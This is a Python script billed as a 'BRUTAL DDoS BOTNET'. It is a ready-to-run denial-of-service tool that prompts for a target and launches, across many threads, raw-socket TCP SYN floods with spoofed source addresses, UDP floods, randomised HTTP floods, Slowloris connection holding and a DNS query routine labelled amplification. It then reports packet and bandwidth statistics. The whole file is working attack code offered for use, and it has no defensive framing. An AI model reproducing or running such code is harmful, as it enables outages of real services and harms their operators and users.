#!/usr/bin/env python3
"""
██████╗ ██████╗ ██████╗ ███████╗    ██████╗ ███████╗██████╗ ███████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║██████╔╝██║  ██║█████╗      ██║  ██║█████╗  ██║  ██║███████╗███████╗
██║  ██║██╔══██╗██║  ██║██╔══╝      ██║  ██║██╔══╝  ██║  ██║╚════██║╚════██║
██████╔╝██║  ██║██████╔╝███████╗    ██████╔╝███████╗██████╔╝███████║███████║
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝
                        BRUTAL DDoS BOTNET v5.0
"""

import socket
import threading
import random
import time
import ssl
import http.client
import urllib.request
import urllib.parse
import struct
import ipaddress
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

class BrutalDDoSAttack:
    def __init__(self, target_ip, target_port=80, duration=300, threads=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.is_attacking = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'connections': 0,
            'start_time': 0,
            'active_threads': 0
        }
        
        # User Agents for HTTP floods
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
        ]
        
        # Referrers for HTTP floods
        self.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://www.twitter.com/',
        ]

    # ==================== TCP SYN FLOOD ==================== #
    def tcp_syn_flood(self):
        """Brutal TCP SYN Flood Attack"""
        while self.is_attacking:
            try:
                # Create raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Spoof source IP
                source_ip = self.generate_random_ip()
                
                # Build TCP SYN packet
                packet = self.build_tcp_syn_packet(source_ip, self.target_ip)
                
                # Send packet
                sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
                sock.close()
                
            except Exception as e:
                pass

    def build_tcp_syn_packet(self, src_ip, dst_ip):
        """Build TCP SYN packet with IP spoofing"""
        # IP Header
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver, ip_tos, ip_tot_len,
                               ip_id, ip_frag_off, ip_ttl, ip_proto,
                               ip_check, ip_saddr, ip_daddr)
        
        # TCP Header
        tcp_source = random.randint(1024, 65535)
        tcp_dest = self.target_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest,
                                tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags,
                                tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
                         source_address,
                         dest_address,
                         placeholder,
                         protocol,
                         tcp_length)
        psh = psh + tcp_header
        
        tcp_check = self.checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest,
                                tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags,
                                tcp_window, tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header

    # ==================== UDP FLOOD ==================== #
    def udp_flood(self):
        """Brutal UDP Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random payload (1-65507 bytes)
                payload_size = random.randint(1, 65507)
                payload = os.urandom(payload_size)
                
                # Send UDP packet
                sock.sendto(payload, (self.target_ip, self.target_port))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += payload_size
                
                sock.close()
                
            except Exception as e:
                pass

    # ==================== HTTP FLOOD ==================== #
    def http_flood(self):
        """Brutal HTTP/HTTPS Flood Attack"""
        while self.is_attacking:
            try:
                # Random path and parameters
                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 20)))
                
                # Create connection
                conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=5)
                
                # Random headers
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'Referer': random.choice(self.referers),
                }
                
                # Random method
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if method == 'POST':
                    # Random POST data
                    post_data = urllib.parse.urlencode({
                        'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(100, 1000)))
                    })
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    conn.request(method, path, body=post_data, headers=headers)
                else:
                    conn.request(method, path, headers=headers)
                
                # Get response (but don't read it fully to save bandwidth)
                response = conn.getresponse()
                response.read(1024)  # Read only first KB
                
                self.stats['connections'] += 1
                conn.close()
                
            except Exception as e:
                pass

    # ==================== SLOWLORIS ATTACK ==================== #
    def slowloris_attack(self):
        """Slowloris Attack - Hold connections open"""
        sockets = []
        
        while self.is_attacking and len(sockets) < 1000:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                s.send(f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target_ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                
                sockets.append(s)
                self.stats['connections'] += 1
                
            except:
                pass
        
        # Keep connections alive
        while self.is_attacking:
            for s in sockets[:]:
                try:
                    # Send keep-alive headers
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.uniform(10, 30))
                except:
                    sockets.remove(s)
            
            # Refill sockets
            while self.is_attacking and len(sockets) < 1000:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, self.target_port))
                    sockets.append(s)
                    self.stats['connections'] += 1
                except:
                    break

    # ==================== DNS AMPLIFICATION ==================== #
    def dns_amplification(self, dns_server='8.8.8.8'):
        """DNS Amplification Attack"""
        # Craft DNS query for ANY record (amplification)
        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        domain = 'google.com'
        
        for part in domain.split('.'):
            dns_query += bytes([len(part)]) + part.encode()
        
        dns_query += b'\x00\x00\xff\x00\x01'
        
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(dns_query, (dns_server, 53))
                self.stats['packets_sent'] += 1
                sock.close()
            except:
                pass

    # ==================== MULTI-VECTOR ATTACK ==================== #
    def start_multi_vector_attack(self):
        """Start all attack vectors simultaneously"""
        print(f"[!] Starting BRUTAL DDoS on {self.target_ip}:{self.target_port}")
        print(f"[!] Duration: {self.duration} seconds")
        print(f"[!] Threads: {self.threads}")
        print("[!] ATTACK VECTORS: TCP-SYN, UDP, HTTP, Slowloris, DNS")
        print("[!] Press Ctrl+C to stop attack")
        print("="*50)
        
        self.is_attacking = True
        self.stats['start_time'] = time.time()
        
        # Create thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Distribute attack vectors
            vectors = [
                self.tcp_syn_flood,
                self.udp_flood,
                self.http_flood,
                self.slowloris_attack,
                self.dns_amplification
            ]
            
            # Launch threads for each vector
            for _ in range(self.threads // len(vectors)):
                for vector in vectors:
                    futures.append(executor.submit(vector))
            
            # Monitor attack
            self.show_stats()
            
            # Wait for duration
            time.sleep(self.duration)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for threads
            for future in as_completed(futures):
                try:
                    future.result(timeout=1)
                except:
                    pass
        
        print("\n[!] Attack completed!")
        self.show_final_stats()

    # ==================== UTILITY FUNCTIONS ==================== #
    def generate_random_ip(self):
        """Generate random IP for spoofing"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def show_stats(self):
        """Show live attack statistics"""
        start_time = threading.Thread(target=self._stats_thread)
        start_time.daemon = True
        start_time.start()

    def _stats_thread(self):
        """Statistics display thread"""
        while self.is_attacking:
            elapsed = time.time() - self.stats['start_time']
            packets_per_sec = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            mb_per_sec = (self.stats['bytes_sent'] / (1024*1024)) / elapsed if elapsed > 0 else 0
            
            print(f"\r[+] Packets: {self.stats['packets_sent']:,} | "
                  f"Bytes: {self.stats['bytes_sent']:,} | "
                  f"Connections: {self.stats['connections']:,} | "
                  f"PPS: {packets_per_sec:,.0f} | "
                  f"MB/s: {mb_per_sec:.2f} | "
                  f"Time: {int(elapsed)}s", end='', flush=True)
            
            time.sleep(1)

    def show_final_stats(self):
        """Show final attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        packets_per_sec = self.stats['packets_sent'] / elapsed
        mb_per_sec = (self.stats['bytes_sent'] / (1024*1024)) / elapsed
        
        print("\n" + "="*50)
        print("ATTACK SUMMARY:")
        print(f"  Target: {self.target_ip}:{self.target_port}")
        print(f"  Duration: {elapsed:.2f} seconds")
        print(f"  Total Packets: {self.stats['packets_sent']:,}")
        print(f"  Total Bytes: {self.stats['bytes_sent']:,} ({self.stats['bytes_sent']/(1024*1024):.2f} MB)")
        print(f"  Connections: {self.stats['connections']:,}")
        print(f"  Packets/Second: {packets_per_sec:,.0f}")
        print(f"  Bandwidth: {mb_per_sec:.2f} MB/s")
        print("="*50)

# ==================== MAIN EXECUTION ==================== #
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      BRUTAL DDoS BOTNET v5.0         ║
    ║         Python Edition               ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Get target info
    target_ip = input("[?] Target IP/Domain: ").strip()
    target_port = int(input("[?] Target Port (80): ") or "80")
    duration = int(input("[?] Attack Duration (seconds): ") or "300")
    threads = int(input("[?] Number of Threads: ") or "1000")
    
    # Resolve domain to IP if needed
    try:
        target_ip = socket.gethostbyname(target_ip)
    except:
        print(f"[!] Could not resolve {target_ip}")
        return
    
    print(f"[+] Target resolved to: {target_ip}")
    
    # Create attack object
    attack = BrutalDDoSAttack(target_ip, target_port, duration, threads)
    
    # Start attack
    try:
        attack.start_multi_vector_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        attack.is_attacking = False
        time.sleep(2)
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Check for root privileges (required for raw sockets)
    if os.name == 'posix' and os.geteuid() != 0:
        print("[!] This script requires root privileges for SYN flood!")
        sys.exit(1)
    
    main()
